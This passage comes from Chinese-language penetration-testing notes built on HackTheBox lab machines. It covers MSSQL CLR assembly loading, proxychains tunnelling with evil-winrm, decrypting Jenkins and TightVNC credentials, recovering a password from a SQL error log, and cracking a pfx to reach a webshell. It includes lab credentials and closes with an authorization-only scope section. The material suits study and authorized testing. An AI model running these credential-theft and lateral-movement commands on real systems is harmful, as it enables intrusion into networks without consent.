python3 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.129.228.115' -install -clr assembly.dll
python3 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.129.228.115' -start -reciclador 'C:\Windows\Temp\reciclador.dll'
```

### 6.3 proxychains4 链式

`/etc/proxychains4.conf` 末尾加 `socks5  127.0.0.1 1337`，之后所有工具前挂 proxychains 连 127.0.0.1 走隧道到目标：
```bash
proxychains evil-winrm -i 127.0.0.1 -u svc_mssql -p '#mssql_s3rV1c3!2020'
```
来源：HTB-PivotAPI

## 7. 服务凭据离线解密（拿到密文→按表解）

### 7.1 Jenkins master.key + hudson.util.Secret 双层 AES

config.xml 里 `{AQA...}` 加密串 + secrets 目录两文件（来源：HTB-Object，文章附完整 decrypt.py）：
```bash
type c:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key
powershell -nop -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret'))"
```
（hudson.util.Secret 以 base64 回传后 `base64 -d` 存回二进制）
算法双层：第一层 `AES-ECB(SHA-256(master.key)[:16])` 解 hudson.util.Secret，取解密结果前 16 字节为 confidentiality_key；第二层解凭据 blob（`blob[0]==1` 新格式，4B iv_len + 4B data_len + iv + data，AES-CBC，去 PKCS7）。运行：
```bash
python3 decrypt.py '{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}' master.key hudson.util.Secret
```
输出 `c1cdfun_d2434`。

### 7.2 VNC 注册表 DES（TightVNC 固定密钥）

共享里 `VNC Install.reg` 的 `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f` 拼成 hex 串后用固定 DES 密钥解：
```bash
echo '6bcf2a4b6e5aca0f' | xxd -r -p | openssl enc -d -des-ecb -K E84AD660C4721AE0 -nopad
```
来源：HTB-Cascade（出 `sT333ve2`）

### 7.3 MSSQL ERRORLOG.BAK（口令误输进用户名框）

```powershell
type C:\SQLServer\Logs\ERRORLOG.BAK
```
来源：HTB-Escape——失败登录日志把"口令误输进用户名框"的值原样记录：`Logon failed for user 'NuclearMosquito3'` 即该用户真实口令。

### 7.4 pfx 破解 → Firefox 导入访问 mTLS 站点

pfx2john 生成 hash 后：
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt staff.hash
```
来源：HTB-Search（破出 `misspissy`）。在 firefox 的 setting 中添加认证（导入 pfx）→ 访问 `https://search.htb/staff` 拿 webshell。**证书认证的内部站点是隐藏攻击面**：破出的 pfx 不只用于登录，导入浏览器可进 mTLS 站点。

## 8. 边界与红线对齐

- **仅限授权测试**：本文件全部技术仅在书面授权（明确允许横向移动 / 凭据 dump / 提权 / 域内隧道）或靶场环境使用；真实项目按 SKILL.md Phase 4 门执行——默认禁止凭据 dump、横向移动、持久化与批量导出，授权写明可做时按最小必要原则逐步执行并记录每条命令与结果
- 与 `references/notes/ad-initial-access.md` 分工：彼文件讲零凭据→域内立足（匿名枚举 / AS-REP / 喷洒 / GPP 等）；本文件从"已获域凭据或域内 shell"开始
- 与 `references/notes/privesc-linux-windows.md` 分工：**本文件只讲域内**（横向移动 / 域提权 / 域凭据收割）；拿到 shell 后的本机提权（SeImpersonate/PrintSpoofer、Server Operators binPath 劫持、CLIXML+RunasCs、SeDebug 迁移、Defender 排除目录识别等）见彼文件
- 爆破与 hashcat 模式速查、传文件、反弹矩阵 → `references/notes/field-ops-toolbox.md`
